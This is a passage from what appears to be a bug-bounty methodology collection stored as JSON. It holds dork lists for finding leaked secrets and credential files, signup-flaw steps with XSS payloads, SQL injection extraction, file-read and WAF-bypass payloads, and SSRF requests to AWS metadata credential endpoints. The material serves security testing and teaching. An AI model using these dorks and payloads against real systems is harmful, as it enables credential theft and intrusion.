zEAwa1hkOw6kvzR4z9dx0XmpvORuo1h4Ag0LCxAR70ZueGyStqpaXoFmTWB1z0WWwooAd0kgDwMDSOcH60Pv4mew=\r\nY8=\r\nYANGSHUN_GH_PASSWORD=\r\nYANGSHUN_GH_TOKEN=\r\nYEi8xQ=\r\nYHrvbCdCrtLtU=\r\nYO0=\r\nYszo3aMbp2w=\r\nYT_ACCOUNT_CHANNEL_ID=\r\nYT_ACCOUNT_CLIENT_ID=\r\nYT_ACCOUNT_CLIENT_SECRET=\r\nYT_ACCOUNT_REFRESH_TOKEN=\r\nYT_API_KEY=\r\nYT_CLIENT_ID=\r\nYT_CLIENT_SECRET=\r\nYT_PARTNER_CHANNEL_ID=\r\nYT_PARTNER_CLIENT_ID=\r\nYT_PARTNER_CLIENT_SECRET=\r\nYT_PARTNER_ID=\r\nYT_PARTNER_REFRESH_TOKEN=\r\nYT_SERVER_API_KEY=\r\nYVxUZIA4Cm9984AxbYJGSk=\r\nzendesk-travis-github=\r\nzenSonatypePassword=\r\nzenSonatypeUsername=\r\nzf3iG1I1lI8pU=\r\nzfp2yZ8aP9FHSy5ahNjqys4FtubOWLk=\r\nZHULIANG_GH_TOKEN=\r\nZOPIM_ACCOUNT_KEY=\r\nZZiigPX7RCjq5XHbzUpPpMbC8MFxT2K3jcFXUitfwZvNaZXJIiK3ZQJU4ayKaegLvI91x1SqH0=\r\n\\\"type\\\": \\\"service_account\\\"\r\n\\?AccessKeyId=\r\n\\?access_token=\r\n\\?account=\r\n\\?id=\r\n_02ddd67d5586_key=\r\n_8382f1c42598_iv=\r\nfilename:.npmrc _auth\r\nfilename:.dockercfg auth\r\nextension:pem private\r\nextension:ppk private\r\nfilename:id_rsa or filename:id_dsa\r\nextension:sql mysql dump\r\nextension:sql mysql dump password\r\nfilename:credentials aws_access_key_id\r\nfilename:.s3cfg\r\nfilename:wp-config.php\r\nfilename:.htpasswd\r\nfilename:.env DB_USERNAME NOT homestead\r\nfilename:.env MAIL_HOST=smtp.gmail.com\r\nfilename:.git-credentials\r\nPT_TOKEN language:bash\r\nfilename:.bashrc password\r\nfilename:.bashrc mailchimp\r\nfilename:.bash_profile aws\r\nrds.amazonaws.com password\r\nextension:json api.forecast.io\r\nextension:json mongolab.com\r\nextension:yaml mongolab.com\r\njsforce extension:js conn.login\r\nSF_USERNAME salesforce\r\nfilename:.tugboat NOT _tugboat\r\nHEROKU_API_KEY language:shell\r\nHEROKU_API_KEY language:json\r\nfilename:.netrc password\r\nfilename:_netrc password\r\nfilename:hub oauth_token\r\nfilename:robomongo.json\r\nfilename:filezilla.xml Pass\r\nfilename:recentservers.xml Pass\r\nfilename:config.json auths\r\nfilename:idea14.key\r\nfilename:config irc_pass\r\nfilename:connections.xml\r\nfilename:express.conf path:.openshift\r\nfilename:.pgpass\r\nfilename:proftpdpasswd\r\nfilename:ventrilo_srv.ini\r\n[WFClient] Password= extension:ica\r\nfilename:server.cfg rcon password\r\nJEKYLL_GITHUB_TOKEN\r\nfilename:.bash_history\r\nfilename:.cshrc\r\nfilename:.history\r\nfilename:.sh_history\r\nfilename:sshd_config\r\nfilename:dhcpd.conf\r\nfilename:prod.exs NOT prod.secret.exs\r\nfilename:prod.secret.exs\r\nfilename:configuration.php JConfig password\r\nfilename:config.php dbpasswd\r\nfilename:config.php pass\r\npath:sites databases password\r\nshodan_api_key language:python\r\nshodan_api_key language:shell\r\nshodan_api_key language:json\r\nshodan_api_key language:ruby\r\nfilename:shadow path:etc\r\nfilename:passwd path:etc\r\nextension:avastlic \"support.avast.com\"\r\nfilename:dbeaver-data-sources.xml\r\nfilename:sftp-config.json\r\nfilename:.esmtprc password\r\nextension:json googleusercontent client_secret\r\nHOMEBREW_GITHUB_API_TOKEN language:shell\r\nxoxp OR xoxb\r\n.mlab.com password\r\nfilename:logins.json\r\nfilename:CCCam.cfg\r\nmsg nickserv identify filename:config\r\nfilename:settings.py SECRET_KEY\r\nfilename:secrets.yml password\r\nfilename:master.key path:config\r\nfilename:deployment-config.json\r\nfilename:.ftpconfig\r\nfilename:.remote-sync.json\r\nfilename:sftp.json path:.vscode\r\nfilename:WebServers.xml\r\n```\r\n\r\n## Author:\r\n[@manasH4rsh](https://twitter.com/manasH4rsh)\r\n"
    },
    {
      "Github_Recon_Method.md": "# Github Recon\r\nUsing Github we can find sensitive infos.\r\n\r\n## Steps:\r\n\r\n1. Check github with company name for API keys or passswords.\r\n2. Enumerate the employees of the company from linkedin and twitter and check their repositories on github for sensitive information.\r\n3. Check source code of main website and subdomains for github links in the html comments or anywhere. Search using ctl-F and search for keyword github\r\n\r\n## Tools and references::\r\n* https://github.com/BishopFox/GitGot\r\n* https://github.com/hisxo/gitGraber\r\n* https://github.com/tillson/git-hound\r\n* https://securitytrails.com/blog/github-dorks\r\n\r\n## Reports (Hackerone)\r\n\r\n### Resolved\r\n\r\n- [Important information leaked on Github](https://hackerone.com/reports/649322)\r\n- [Github Token Leaked publicly for https://github.com/mopub](https://hackerone.com/reports/612231)\r\n- [CircleCI token in github repo allows for access to sensitive build information](https://hackerone.com/reports/858915)\r\n- [Information Leak - Github - JMS Information](https://hackerone.com/reports/360811)\r\n- [Leaked artifactory_key, artifactory_api_key, and gcloud refresh_token via GitHub.](https://hackerone.com/reports/496414)\r\n- [Github Token Leaked publicly for https://github.sc-corp.net](https://hackerone.com/reports/396467)\r\n\r\n## Author:\r\n* [@0xCCFFF](https://twitter.com/0xCCFFF) (MadMaxx)\r\n* [@klaus](https://twitter.com/klaus_dev)\r\n"
    },
    {
      "Google_Dorks.md": "### Google Dorks to find Juicy Content\r\n\r\n`inurl:example.com intitle:\"index of\"` <br>\r\n`inurl:example.com intitle:\"index of /\" \"*key.pem\"` <br>\r\n`inurl:example.com ext:log` <br>\r\n`inurl:example.com intitle:\"index of\" ext:sql|xls|xml|json|csv` <br>\r\n`inurl:example.com \"MYSQL_ROOT_PASSWORD:\" ext:env OR ext:yml -git` <br>\r\n`inurl:example.com intitle:\"index of\" \"config.db\"` <br>\r\n`inurl:example.com allintext:\"API_SECRET*\" ext:env | ext:yml` <br>\r\n`inurl:example.com intext:admin ext:sql inurl:admin` <br>\r\n`inurl:example.com allintext:username,password filetype:log` <br>\r\n`site:example.com \"-----BEGIN RSA PRIVATE KEY-----\" inurl:id_rsa`<br>\r\n`site:*.gov.* \"responsible disclosure\"`<br>\r\n\r\n[object Promise] <br>\r\n\r\n\r\n[Refrence](https://blog.usejournal.com/how-recon-helped-samsung-protect-their-production-repositories-of-samsungtv-ecommerce-estores-4c51d6ec4fdd)\r\n\r\n\r\n#### Other than Google, Try these dorks on various Search Engines such as Duck Duck Go, Bing etc.\r\n\r\n## Reports (Hackerone)\r\n\r\n### Resolved\r\n\r\n- [Securing \"Reset password\" pages from bots](https://hackerone.com/reports/43807)\r\n- [Private Grab Messages on Android App can be accessed and cached by Search Engines](https://hackerone.com/reports/221558)\r\n\r\n### Informative\r\n\r\n- [Information disclosure through search engines (password reset token)](https://hackerone.com/reports/322988)\r\n\r\n### N/A\r\n\r\n- [Research papers on yelp are getting indexed by google bots.](https://hackerone.com/reports/207435)\r\n\r\n\r\nAuthor \r\n- [Keshav Malik](twitter.com/g0t_rOoT_) <br>\r\n- [Naveen Prakaasham](twitter.com/NPrakaasham) <br>\r\n- [@klaus](https://twitter.com/klaus_dev)\r\n- [Fani Malik](https://twitter.com/fanimalikhack)\r\n"
    },
    {
      "Shodan_cve_dorks.md": "## CVE's Shodan Dorks.\r\n\r\n* Big IP shodan Search:- \r\n\r\n`http.title:\"BIG-IP&reg;-Redirect\" org:Org`\r\n\r\n* CVE 2020-3452\r\n \r\n` http.html_hash:-628873716 \r\n“set-cookie: webvpn;”` \r\n\r\n* CVE CVE-2019-11510\r\n\r\n`http.html:/dana-na/`  \r\n\r\n* CVE-2020–5902\r\n \r\n ```inurl:/tmui/login.jsp```\r\n\r\n\r\n## Author:\r\n- [@manasH4rsh](https://twitter.com/manasH4rsh)\r\n- [Fani Malik](https://twitter.com/FaniMalikHack)\r\n"
    }
  ],
  "Sign_Up_Functionality": [
    {
      "Hunting_for_bugs_in_signup_feature.md": "### Implementing the Sign Up Feature:\r\n\r\nWe will take the example of a School Website(**school.org**) to learn the implementation of Sign Up Feature:  \r\nIn this Example, The Students need to register to **school.org** for accessing their Academic educational resource. Users of **school.org** must have the ability to register as a member thus gaining access to the content of the site.\r\n\r\nSo, The Signup process can be implemented by school in two ways:\r\n\r\n1.  **Manual Signup** — Registration based on user providing a series of specific user information. It usually includes form like name, email, password, confirm password, etc. as shown in image below.\r\n\r\n\r\n2.  **Social Signup** **/OAuth**— Registration via an integrated social media source via social media platform like _Facebook_, _Twitter_, or _Google_, the user can sign into a third party website instead of creating a new account specifically for that website.\r\n\r\nIn this Blog I will be talking about Bugs in Manual Sign up. Lets have Social Signup/ OAuth for our next blog topic.\r\n\r\n### Exploiting Signup Feature:\r\n\r\n#### 1\\. Duplicate registration / Overwrite existing user.\r\n\r\nDuplicate registration is when an application allows us to register or sign up with the same email address, username or phone number. It can have critical consequences based on what kind of attack is performed.\r\n\r\n**_Steps to reproduce:_**\r\n\r\n1) Create first account in application with email say [abc@gmail.com](mailto:abc@gmail.com) and password.  \r\n2) Logout of the account and create another account with same email and different password.  \r\n3) You can even try to change email case in some case like from [abc@gmail.com](mailto:abc@gmail.com) to [Abc@gmail.com](mailto:Abc@gmail.com)  \r\n4) Finish the creation process — and see that it succeeds  \r\n5) Now go back and try to login with email and the new password. You are successfully logged in.\r\n\r\n> **Further Read**  \r\n>  [https://hackerone.com/reports/187714](https://hackerone.com/reports/187714)  \r\n>  [https://shahjerry33.medium.com/duplicate-registration-the-twinning-twins-883dfee59eaf](https://shahjerry33.medium.com/duplicate-registration-the-twinning-twins-883dfee59eaf)  \r\n>  [https://blog.securitybreached.org/2020/01/22/user-account-takeover-via-signup-feature-bug-bounty-poc/](https://blog.securitybreached.org/2020/01/22/user-account-takeover-via-signup-feature-bug-bounty-poc/)\r\n\r\n#### 2\\. DOS at Name/Password field in Signup Page.\r\n\r\nBy sending a very long string (100000 characters) it’s possible to cause a denial a service attack on the server. This may lead to the website becoming unavailable or unresponsive. Usually this problem is caused by a vulnerable string hashing implementation. When a long string is sent, the string hashing process will result in CPU and memory exhaustion.\r\n\r\n**_Steps to reproduce:_**\r\n\r\n1) Go Sign up form.  \r\n2) Fill the form and enter a long string in password  \r\n3) Click on enter and you’ll get 500 Internal Server error if it is vulnerable.\r\n\r\n> Further Read  \r\n>  [https://shahjerry33.medium.com/long-string-dos-6ba8ceab3aa0](https://shahjerry33.medium.com/long-string-dos-6ba8ceab3aa0)  \r\n>  [https://hackerone.com/reports/738569](https://hackerone.com/reports/738569)  \r\n>  [https://hackerone.com/reports/223854](https://hackerone.com/reports/223854)\r\n\r\n#### 3\\. Cross-Site Scripting (XSS) in username, account name for registration.\r\n\r\n**Cross-site Scripting** (**XSS**) is a security vulnerability usually found in websites and/or web applications that accept user input. This injects the malicious code into the targeted website’s content, making it a part of the website and thus allowing it to affect victims who may visit or view that website.\r\n\r\nNow, for testing Signup page for XSS we can simply insert XSS payoad in fields like: username, email, password,etc.\r\n\r\nPayload for Username field : **<svg/onload=confirm(1)>**  \r\nPayload for Email field : **“><svg/onload=confirm(1)>”@x.y**\r\n\r\n> Further Read  \r\n>  [https://hackerone.com/reports/196989](https://hackerone.com/reports/196989)  \r\n>  [https://hackerone.com/reports/470206](https://hackerone.com/reports/470206)  \r\n>  [https://hackerone.com/reports/119090](https://hackerone.com/reports/119090)\r\n\r\n#### 4\\. No Rate Limit at Signup Page.\r\n\r\nA **rate limiting** algorithm is used to check if the user session (or IP address) has to be **limited** based on the information in the session cache. Testing for Rate limit at Signup page is quite a good idea.\r\n\r\nThe Impact can be explained very well. If there is no rate limiting on signup page a malicious users can generate hundreds and thousands of fake accounts that lead to fill the application DataBase with fake accounts, Which can impact the business in many ways.\r\n\r\nYou can easily test for it with Burp Intruder.  \r\n1\\. Capture the signup request and send it to Intruder.  \r\n2\\. Add different emails as payload .  \r\n3\\. Fire up Intruder, And check whether it returns 200 OK.\r\n\r\n\r\n> Further Read  \r\n>  [https://hackerone.com/reports/905692](https://hackerone.com/reports/905692)  \r\n>  [https://hackerone.com/reports/97609](https://hackerone.com/reports/97609)  \r\n>  [https://hackerone.com/reports/262830](https://hackerone.com/reports/262830)\r\n\r\n#### 5\\. Insufficient Email Verification.\r\n\r\nInsufficient Email Verification means the application doesn’t verify the email id or the verification mechanism is too weak to be bypassed. You can easily Bypass Email Verification with some of the following common methods like:\r\n\r\n1.  Forced Browsing. (directly navigating to files which comes after verifying the email)\r\n2.  Response or Status Code Manipulation. (Replacing the bad response status like 403 to 200 can be useful)\r\n3.  There are much more ways of bypassing . **Tip**: Just google it.\r\n#### Email verification bypass after signup:-\r\n\r\n```\r\n1. Sing up on the web application as attacker@mail.com\r\n2. You will receive a confirmation email on attacker@mail.com, do not open that link now.\r\n3. The application may ask for confirming your email, check if it allows navigating to account settings page.\r\n4. On settings page check if you can change the email.\r\n5. If allowed, change the email to victim@mail.com.\r\n6. Now you will be asked to confirm victim@mail.com by opening the confirmation link received on victim@mail.com, insted of opening the new link go to attacker@mail.com inbox and open the previous received link.\r\n7. If the application verifies vitim@mail.com by using perivious verification link received on attacker mail, then this is a email verification bypass. \r\n```\r\n> Further Read  \r\n>  [https://hackerone.com/reports/1040047](https://hackerone.com/reports/1040047)  \r\n>  [https://hackerone.com/reports/617896](https://hackerone.com/reports/617896)  \r\n>  [https://hackerone.com/reports/737169](https://hackerone.com/reports/737169)\r\n\r\n#### 6\\. Path Overwrite\r\n\r\nIf an application allows users to check their profile with direct path /{username} always try to signup with system reserved file names, such as index.php, signup.php, login.php, etc. In some cases what happens here is, when you signup with username: `index.php`, now upon visiting target.tld/index.php, your profile will comeup and occupy the index.php page of an application. Similarly, if an attacker is able to signup with username `login.php`, Imagine login page getting takeovered.\r\n\r\n> Further Read:\r\nhttps://infosecwriteups.com/logical-flaw-resulting-path-hijacking-dd4d1e1e832f\r\n  \r\n**_Thanks for Reading. Any Suggestions are always welcomed!!_**\r\n\r\n## Sources:-\r\n\r\n+ https://twitter.com/kushagrasarathe/status/1385111472385060867?s=19\r\n\r\n## Author:-\r\n\r\n+ @Kushagra Sarathe - [Twitter](https://twitter.com/kushagrasarathe) & [GitHub](https://github.com/kushagrasarathe)\r\n+ @Sm4rty - [Twitter](https://twitter.com/Sm4rty\\_)  , [LinkedIn](https://www.linkedin.com/in/sm4rty) &  [Instragram](https://www.instagram.com/sm4rty)\r\n"
    }
  ],
  "SQLi": [
    {
      "SQL_Injection.md": "# SQL Injection\r\nHere are some quick methods to detect the SQL Injection vulnerability, though the methods are not limited. There are various tricks and tools.\r\n\r\n# Methods To Find Sqli\r\n\r\n## 1. Using Burpsuite :\r\n```\r\n  1. Capture the request using burpsuite.\r\n  2. Send the request to burp scanner.\r\n  3. Proceed with active scan.\r\n  4. Once the scan is finished, look for SQL vulnerability that has been detected.\r\n  5. Manually try SQL injection payloads.\r\n  6. Use SQLMAP to speed up the process.\r\n```\r\n## 2. Using waybackurls and other bunch of tools :\r\n```\r\n  1. sublist3r -d target | tee -a domains (you can use other tools like findomain, assetfinder, etc.)\r\n  2. cat domains | httpx | tee -a alive\r\n  3. cat alive | waybackurls | tee -a urls\r\n  4. gf sqli urls >> sqli\r\n  5. sqlmap -m sqli --dbs --batch\r\n  6. use tamper scripts\r\n```\r\n* More Details in this source thread [https://twitter.com/El3ctr0Byt3s/status/1302706241240731649](https://twitter.com/El3ctr0Byt3s/status/1302706241240731649)\r\n\r\n## 3. Using heuristic scan to get hidden parameters :\r\n```\r\n  1. Use subdomain enumeration tools on the domain.\r\n  2. Gather all urls using hakcrawler, waybackurls, gau for the domain and subdomains.\r\n  3. You can use the same method described above in 2nd point.\r\n  4. Use Arjun to scan for the hidden params in the urls. \r\n  5. Use --urls flag to include all urls.\r\n  6. Check the params as https://domain.com?<hiddenparam>=<value>\r\n  7. Send request to file and process it through sqlmap.\r\n```\r\n## 4. Error generation with untrusted input or special characters :\r\n```\r\n  1. Submit single quote character ' & look for errors.\r\n  2. Submit SQL specific query.\r\n  3. Submit Boolean conditions such as or 1=1 and or 1=0, and looking application's response.\r\n  4. Submit certain payloads that results in time delay.\r\n```\r\n# Post-Methods\r\n## 1. Finding total number of columns with order by or group by or having :\r\n```\r\n  Submit a series of ORDER BY clause such as \r\n\t  \r\n    ' ORDER BY 1 --\r\n\t  ' ORDER BY 2 --\r\n    ' ORDER BY 3 --\r\n    \r\n    and incrementing specified column index until an error occurs.\r\n```\r\n## 2. Finding vulnerable columns with union operator :\r\n```\r\n  Submit a series of UNION SELECT payloads.\r\n  \r\n\t  ' UNION SELECT NULL --\r\n    ' UNION SELECT NULL, NULL --\r\n    ' UNION SELECT NULL, NULL, NULL --\r\n    \r\n  (Using NULL maximizes the probability that the payload will succeed. NULL can be converted to every commonly used data type.)\r\n```\r\n* To go for the methods in more detail, go through portswigger site.\r\n  \r\n  https://portswigger.net/web-security/sql-injection/union-attacks\r\n\r\n## 3. Extracting basic information like database(), version(), user(), UUID() with concat() or group_concat()\r\n\r\n### 1. Database version\r\n```\r\n    Oracle \t\t\t  SELECT banner FROM v$version\r\n\t\t       \t\t  SELECT version FROM v$instance\r\n    \r\n    Microsoft \t\t\t  SELECT @@version\r\n    \r\n    PostgreSQL \t\t\t  SELECT version()\r\n    \r\n    MySQL \t\t\t  SELECT @@version\r\n```\r\n### 2. Database contents\r\n```\r\n    Oracle        SELECT * FROM all_tables\r\n\t          SELECT * FROM all_tab_columns WHERE table_name = 'TABLE-NAME-HERE'\r\n    \r\n    Microsoft \t  SELECT * FROM information_schema.tables\r\n                  SELECT * FROM information_schema.columns WHERE table_name = 'TABLE-NAME-HERE'\r\n    \r\n    PostgreSQL \t  SELECT * FROM information_schema.tables\r\n                  SELECT * FROM information_schema.columns WHERE table_name = 'TABLE-NAME-HERE'\r\n\r\n    MySQL         SELECT * FROM information_schema.tables\r\n                  SELECT * FROM information_schema.columns WHERE table_name = 'TABLE-NAME-HERE'\r\n```\r\n### 3. Shows version, user and database name\r\n```\r\n   ' AND 1=2 UNION ALL SELECT concat_ws(0x3a,version(),user(),database())\r\n```\r\n### 4. Using group_concat() function, used to concat all the rows of the returned results.\r\n```  \r\n   ' union all select 1,2,3,group_concat(table_name),5,6 from information_schema.tables where table_schema=database()–\r\n```\r\n## 4. Accessing system files with load_file(). and advance exploitation afterwards :\r\n```\r\n   ' UNION ALL SELECT LOAD_FILE ('/ etc / passwd')\r\n```\r\n## 5. Bypassing WAF :\r\n\r\n### 1. Using Null byte before SQL query.\r\n```\r\n    %00' UNION SELECT password FROM Users WHERE username-'xyz'--\r\n```\r\n### 2. Using SQL inline comment sequence.\r\n```\r\n    '/**/UN/**/ION/**/SEL/**/ECT/**/password/**/FR/OM/**/Users/**/WHE/**/RE/**/username/**/LIKE/**/'xyz'-- \r\n```\r\n### 3. URL encoding\r\n```      \r\n      for example :\r\n    / URL encoded to %2f\r\n    * URL encoded to %2a\r\n\r\n    Can also use double encoding, if single encoding doesn't works. Use hex encoding if the rest doesn't work.\r\n```\r\n### 4. Changing Cases (uppercase/lowercase)\r\n* For more step wise detailed methods, go through the link below.\r\n\r\n  https://owasp.org/www-community/attacks/SQL_Injection_Bypassing_WAF\r\n### 5. Use SQLMAP tamper scripts. It helps bypass WAF/IDS/IPS.\r\n* 1. Use Atlas. It helps suggesting tamper scripts for SQLMAP.\r\n     \r\n     https://github.com/m4ll0k/Atlas\r\n* 2. JHaddix post on SQLMAP tamper scripts.\r\n     \r\n     https://forum.bugcrowd.com/t/sqlmap-tamper-scripts-sql-injection-and-waf-bypass/423\r\n        \r\n## 6. Time Delays :\r\n```\r\n      Oracle \t      dbms_pipe.receive_message(('a'),10)\r\n      \r\n      Microsoft \t  WAITFOR DELAY '0:0:10'\r\n      \r\n      PostgreSQL \t  SELECT pg_sleep(10)\r\n      \r\n      MySQL \t      SELECT sleep(10) \r\n```      \r\n## 7. Conditional Delays :\r\n```\r\n      Oracle \t      SELECT CASE WHEN (YOUR-CONDITION-HERE) THEN 'a'||dbms_pipe.receive_message(('a'),10) ELSE NULL END FROM dual\r\n      \r\n      Microsoft \t  IF (YOUR-CONDITION-HERE) WAITFOR DELAY '0:0:10'\r\n      \r\n      PostgreSQL \t  SELECT CASE WHEN (YOUR-CONDITION-HERE) THEN pg_sleep(10) ELSE pg_sleep(0) END\r\n      \r\n      MySQL \t      SELECT IF(YOUR-CONDITION-HERE,sleep(10),'a') \r\n```      \r\n# Resources and tools that will help gain an upper hand on finding bugs :\r\n* Portswigger SQL Injection cheat sheet - https://portswigger.net/web-security/sql-injection/cheat-sheet\r\n* HTTPX - https://github.com/encode/httpx\r\n* GF patterns - https://github.com/1ndianl33t/Gf-Patterns\r\n* GF (Tomnomnom)- https://github.com/tomnomnom/gf\r\n* We can also use gau with waybackurls to fetch all urls.\r\n* Waybackurls - https://github.com/tomnomnom/waybackurls\r\n* Gau - https://github.com/lc/gau\r\n* Arjun - https://github.com/s0md3v/Arjun\r\n* Hakcrawler - https://github.com/hakluke/hakrawler\r\n\r\n\r\n### Author :\r\n\r\n* [@xhan1x](https://twitter.com/xhan1x)\r\n"
    }
  ],
  "SSRF": [
    {
      "Blind_SSRF.md": "# Blind SSRF\r\nBlind SSRF's are those that don't show enumerated data directly to the user and hence are known as blind SSRF.\r\n\r\n## Different Methods:\r\n\r\n### Methodology #1:\r\n**Header** **Injection**:\r\n\r\nOne way of finding them is by inserting your burp collaborator domain into the referrer header also known as host header injection.\r\n\r\nSnippet:\r\n```\r\n    GET /HTTP 1.1\r\n    Host: site.tld\r\n    User Agent: Firefox\r\n    Referrer: https://your_collaborator_instance.com\r\n\r\n```\r\n\r\n\r\n Many organizations use services that analyse which url or service is referring the visitor to their site. Execution of this type of attack depends upon the underlying service in my case the server was running on an aws ec2 instance but i was unable to get to it's admin panel namely (192.168.192.168) as it was only performing a lookup on me but not allowing anythng beyond that. Try it on different sites and services that you come across you just might get lucky.\r\n\r\nI will list more as i find if you have found any please kindly list them here so that other's beneift from it.\r\n\r\n### Contributor:\r\n * [@cowlingbanana](https://github.com/cowlingbanana)\r\n\r\n"
    },
    {
      "SSRF-old.md": "# SSRF ( Server-Side-Request-Forgery)\r\n* What's SSRF ??\r\n   * SSRF is a type of exploit where an attacker abuses the functionality of a server causing it to access or manipulate information in the realm of that server that would otherwise not be directly accessible to the attacker.\r\n\r\n## Where to look for ??\r\n\r\n1. If you got Open Redirect try escalating it to SSRF.\r\n\r\n2. gf SSRF to grep parameters may vulnerable to SSRF.\r\n\r\n3. SSRF's are more in API's so crawl the whole web app with burp proxy turned on and search for keywords like., eg :\r\n```\r\n?url=\r\n?uri=\r\n?req= \r\netc.....\r\n```\r\n4. Sign up with an Email like blabla.collaborator.net. If u receive HTTP req. in collaborator then its SSRF. But if there's no impact Don't Report it :) DNS and SMTP req. Doesn't matters.\r\n\r\n## AWS Metadata\r\nMost of the sites use AWS nowadays...\r\n\r\n* AWS localhost is 169.254.169.254 so don't use 127.0.0.1 there!\r\n\r\n* If you found an SSRF vulnerability that runs on EC2, try requesting :\r\n```\r\nhttp://169.254.169.254/latest/meta-data/\r\nhttp://169.254.169.254/latest/user-data/\r\nhttp://169.254.169.254/latest/meta-data/iam/security-credentials/IAM_USER_ROLE_HERE\r\nhttp://169.254.169.254/latest/meta-data/iam/security-credentials/flaws/\r\n```\r\n* Source: https://twitter.com/ADITYASHENDE17/status/1305051512335298562\r\n\r\n## Escalation\r\n\r\n* SSRF can be Escalated to RCE :) [Impact High] \r\n* `<os cmd>`.collaborator.net (thehackerish has a good video in it :)\r\n* If there's no impact! on your SSRF rather than a redirect try to escalate it to XSS.\r\n\r\n## Resources 💯\r\n### Youtube\r\n* https://www.youtube.com/watch?v=U0bPPw6uPgY&t=1s\r\n* https://www.youtube.com/watch?v=324cZic6asE\r\n* https://www.youtube.com/watch?v=o-tL9ULF0KI\r\n* https://www.youtube.com/watch?v=324cZic6asE&t=751s\r\n* https://youtu.be/m4BxIf9PUx0\r\n* https://youtu.be/apzJiaQ6a3k\r\n* [A New Era of SSRF](https://www.youtube.com/watch?v=R9pJ2YCXoJQ) by [Orange Tsai](https://blog.orange.tw/)\r\n\r\n### Hackerone Reports\r\n* https://hackerone.com/hacktivity?order_field=popular&filter=type%3Apublic&querystring=SSRF\r\n* https://hackerone.com/reports/737161\r\n* https://hackerone.com/reports/816848\r\n* https://hackerone.com/reports/398799\r\n* https://hackerone.com/reports/382048\r\n* https://hackerone.com/reports/406387\r\n* https://hackerone.com/reports/736867\r\n* https://hackerone.com/reports/517461\r\n* https://hackerone.com/reports/508459\r\n* https://hackerone.com/reports/738553\r\n* https://hackerone.com/reports/514224\r\n* https://www.hackerone.com/blog-How-To-Server-Side-Request-Forgery-SSRF\r\n* https://hackerone.com/reports/341876\r\n* https://hackerone.com/reports/793704\r\n* https://hackerone.com/reports/386292\r\n* https://hackerone.com/reports/326040\r\n* https://hackerone.com/reports/310036\r\n* https://hackerone.com/reports/643622\r\n* https://hackerone.com/reports/885975\r\n* https://hackerone.com/reports/207477\r\n* https://hackerone.com/reports/514224\r\n\r\n### Blogs\r\n* https://medium.com/@madrobot/ssrf-server-side-request-forgery-types-and-ways-to-exploit-it-part-1-29d034c27978\r\n* https://medium.com/@kapilvermarbl/ssrf-server-side-request-forgery-5131ffd61c3c\r\n* https://medium.com/@zain.sabahat/exploiting-ssrf-like-a-boss-c090dc63d326\r\n* https://medium.com/@chawdamrunal/what-is-server-side-request-forgery-ssrf-7cd0ead0d95f\r\n* https://medium.com/swlh/ssrf-in-the-wild-e2c598900434\r\n* https://medium.com/@briskinfosec/ssrf-server-side-request-forgery-ae44ec737cb8\r\n* https://medium.com/@GAYA3_R/vulnerability-server-side-request-forgery-ssrf-9fe5428184c1\r\n* https://medium.com/@gupta.bless/exploiting-ssrf-for-admin-access-31c30457cc44\r\n* https://medium.com/bugbountywriteup/server-side-request-forgery-ssrf-f62235a2c151\r\n* https://medium.com/@dlpadmavathi.us/ssrf-attack-real-example-a7279256abee\r\n* https://blog.securityinnovation.com/the-many-faces-of-ssrf\r\n* https://www.netsparker.com/blog/web-security/server-side-request-forgery-vulnerability-ssrf/\r\n* http://www.techpna.com/uptzh/blind-ssrf-medium.html\r\n* https://blog.appsecco.com/finding-ssrf-via-html-injection-inside-a-pdf-file-on-aws-ec2-214cc5ec5d90\r\n* http://institutopaideia.com.br/journal/blind-ssrf-medium-cfa769\r\n* https://www.reddit.com/r/bugbounty/comments/cux2zs/ssrf_in_the_wild_the_startup_medium/\r\n* https://www.sonrn.com.br/blog/5a44cc-blind-ssrf-medium\r\n* https://ssrf-bypass-medium.thickkare.pw/\r\n* https://hackerone.com/reports/326040\r\n* https://www.zerocopter.com/vulnerabilities-price-list-printable\r\n* https://medium.com/swlh/intro-to-ssrf-beb35857771f\r\n* https://medium.com/poka-techblog/server-side-request-forgery-ssrf-attacks-part-1-the-basics-a42ba5cc244a\r\n* https://medium.com/@madrobot/ssrf-server-side-request-forgery-types-and-ways-to-exploit-it-part-3-b0f5997e3739\r\n* https://medium.com/bugbountywriteup/server-side-request-forgery-ssrf-testing-b9dfe57cca35\r\n* https://medium.com/@madrobot/ssrf-server-side-request-forgery-types-and-ways-to-exploit-it-part-2-a085ec4332c0\r\n* https://medium.com/bugbountywriteup/tagged/ssrf\r\n* https://medium.com/seconset/all-about-ssrf-524f41ab96df\r\n* https://blog.cobalt.io/from-ssrf-to-port-scanner-3e8ef5921fbf\r\n* https://portswigger.net/web-security/ssrf\r\n* https://book.hacktricks.xyz/pentesting-web/ssrf-server-side-request-forgery\r\n\r\n### Github Repos\r\n* https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Request%20Forgery\r\n* https://github.com/jdonsec/AllThingsSSRF\r\n\r\n### Author:\r\n* [@0xCyberPirate](https://twitter.com/0xCyberPirate)\r\n* [0xrtt](https://twitter.com/0xrtt)\r\n"
    },
    {
      "SSRF.md": "## What is SSRF?\r\n\r\nIn a Server-Side Request Forgery (SSRF) attack, the attacker can abuse functionality on the server to read or update internal resources. The attacker can supply or modify a URL, which the code running on the server will read or submit data. By carefully selecting the URLs, the attacker may be able to read server configuration such as AWS metadata, connect to internal services like HTTP-enabled databases or perform POST requests towards internal services that are not intended to be exposed.\r\n\r\nThe target application may have functionality for importing data from a URL, publishing data to a URL or otherwise reading data from a URL that can be tampered with. The attacker modifies the calls to this functionality by supplying a completely different URL or by manipulating how URLs are built (like path traversal, etc.).\r\n\r\nWhen the manipulated request goes to the server, the server-side code picks up the manipulated URL and tries to read data to the manipulated URL. By selecting target URLs, the attacker may be able to read data from services that are not directly exposed on the internet:\r\n\r\n- **Cloud server meta-data** — Cloud services such as AWS provide a REST interface on http://169.254.169.254/ where important configuration and sometimes even authentication keys can be extracted\r\n- **Database HTTP interfaces** — NoSQL database such as MongoDB provide REST interfaces on HTTP ports. If the database is expected to only be available to internally, authentication may be disabled and the attacker can extract data internal REST interfaces\r\n- **Files** — The attacker may be able to read files using file:// URIs. The attacker may also use this functionality to import untrusted data into code that expects to only read data from trusted sources, and as such circumvent input validation.\r\n\r\n## What is its impact?\r\n\r\nA malicious actor can retrieve the content of arbitrary files on the system, which leads to sensitive information exposure(passwords, source code, confidential data, etc.).\r\n\r\n1. Sensitive Data Exposure\r\n2. Unauthenticated Requests\r\n3. Port Scans or Cross Site Port Attack (XSPA)\r\n4. Protocol Smuggling\r\n\r\n## **Key Points To Test SSRF Vulnerability :**\r\n\r\n1. Always make sure that you are making request to back end server on the 